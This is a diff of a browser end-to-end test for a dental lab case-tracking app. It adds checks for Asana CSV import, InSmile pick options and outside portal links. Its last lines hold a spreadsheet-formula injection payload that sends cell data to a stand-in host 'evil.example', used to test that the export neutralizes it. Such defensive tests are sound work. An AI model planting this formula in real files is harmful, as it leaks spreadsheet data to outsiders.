@@ -258,12 +258,14 @@ async function openByName(p, name) {
     'Task ID,Created At,Completed At,Last Modified,Name,Section/Column,Assignee,Assignee Email,Start Date,Due Date,Tags,Notes,Projects,Parent task',
     '9001,2026-09-20,,2026-09-21,"Imogen Fakeworth - Aligners (Oliv)",SARAH TO Submit,Sarah Tester,,,2026-10-15,,"Patient: Imogen Fakeworth\nAppliance Type: Aligners\nAligner Type: Oliv\nScanner: Allied Star\nAssistant: Gwen\nScan Date: 2026-10-01\nLab Completion Date: 2026-10-22\nDelivery Date: 2026-10-29\nDr. A\'s Instructions: Close all spaces\nPatient\'s CC from Last Visit: -\nIPR & Spacing Tracker app  SPACING Lower: \n LR4–LR3 0.2mm\nTotal: 0.2mm",Oliv,',
     '9002,2026-09-20,,2026-09-21,"Bartholomew Notreal (U/L TT\'s and WT\'s) printing",Gwen - TT\'s/WT\'s,Gwen Tester,,,2026-10-06,,,Retainers and Whitening trays,',
-    '9003,2026-09-20,2026-09-25,2026-09-25,"Old Finished Case - Aligners (In-House)",Checked In,Amir,,,2026-09-24,,,NL Lab,'
+    '9003,2026-09-20,2026-09-25,2026-09-25,"Old Finished Case - Aligners (In-House)",Checked In,Amir,,,2026-09-24,,,NL Lab,',
+    '9004,2025-01-10,,2025-01-14,"Petunia Pickedup (U/L TT\'s)",FRONT DESK PICK UP,Gwen Tester,,,2025-01-15,,,Retainers and Whitening trays,'
   ].join('\n');
   const csvPath = path.join(__dirname, 'asana-sample.csv'); fs.writeFileSync(csvPath, csv);
   await owner.click('#nav-import'); await owner.setInputFiles('#csvFiles', csvPath);
   await owner.waitForSelector('[data-act=doImport]', { timeout: 20000 });
   check(/Ready to import: 2/.test(await owner.textContent('#impPreview')), 'preview: 2 open cases (completed one left out)');
+  check(/1 already delivered/.test(await owner.textContent('#impPreview')), 'an open Asana task already picked up long ago (last column) is left out as delivered');
   await owner.click('[data-act=doImport]'); await owner.waitForSelector('#impPreview .lockOk', { timeout: 30000 });
   await openByName(owner, 'Imogen Fakeworth');
   check(await owner.isVisible('#drawer .step.cur:has-text("To submit")'), 'imported stage mapped from the Asana section');
@@ -493,7 +495,7 @@ async function openByName(p, name) {
   await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
   await owner.click('#ncForm .tt[data-tile=insmile]'); await owner.fill('#cf-patient', 'Ines Smilewright');
   check(await owner.isVisible('.pickRow[data-g=initialDE]') && !(await owner.isVisible('.pickRow[data-g=initial]')), 'asks Initial / DE 1 / DE 2 / DE 3 instead of refinement');
-  check(!(await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Aligners are not tracking well"]')) && await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Resolve black triangles"]') && await owner.isVisible('.pickRow[data-g=goal_ap]'), 'aligner-only pictures hidden for braces; AP and the rest stay');
+  check(!(await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Aligners are not tracking well"]')) && await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Resolve black triangles"]') && await owner.isVisible('.pickRow[data-g=goal_ap]') && !(await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Active retention"]')), 'aligner-only pictures (incl. Active retention) hidden for InSmile; AP and the rest stay');
   check(!(await owner.isVisible('#cf-tc')), 'no aligner tooth chart for braces');
   await owner.click('.pickRow[data-g=initialDE] .pick[data-v=de2]');
   check(await owner.inputValue('#cf-detail') === 'InSmile braces – DE2', 'detail reads InSmile braces – DE2');
@@ -616,6 +618,16 @@ async function openByName(p, name) {
     const rows = asanaRowsFromCSV('Task ID,Name,Section/Column,Projects,Completed At,Parent task\n1,"Test Case - Aligners (In-House)",In Fabrication,NL Lab,,\n2,Exported STLs,,,2026-10-01,"Test Case - Aligners (In-House)"\n3,Sent to printer,,,,"Test Case - Aligners (In-House)"');
     return a === 'print' && b === 'wash' && c === 'fab' && rows.length === 1 && caseFromAsana(rows[0], 'NL Lab', []).stage === 'send';
   }), 'Asana import: the NL Lab checklist (subtasks) picks the fabrication step, from the API or a CSV');
+
+  console.log('\n# Company portals on outside aligner cases');
+  await openByName(owner, 'Petra Tapform');
+  check(await owner.isVisible('#drawer .portals a[href="https://portal.olivortho.com/"][target=_blank]') && await owner.isVisible('#drawer .portals a[href="https://dental-monitoring.com/doctor/login"]'), 'an Oliv case links to the Oliv portal and Dental Monitoring');
+  check((await owner.getAttribute('#drawer .portals a >> nth=0', 'rel')) === 'noopener noreferrer', 'portal links open in a new tab without passing anything along');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+  await openByName(owner, 'Dmitri Distalson'); check((await owner.locator('#drawer .portals').count()) === 0, 'no portal link on appliances');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
+  await openByName(owner, 'Ines Smilewright'); check((await owner.locator('#drawer .portals').count()) === 0, 'no portal link on InSmile');
+  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
 
   console.log('\n# Spreadsheet-formula text is neutralized in the export');
   await owner.fill('#q', ''); await newCase(owner, { type: 'models', patient: '=HYPERLINK("http://evil.example/?"&A1,"x")' });
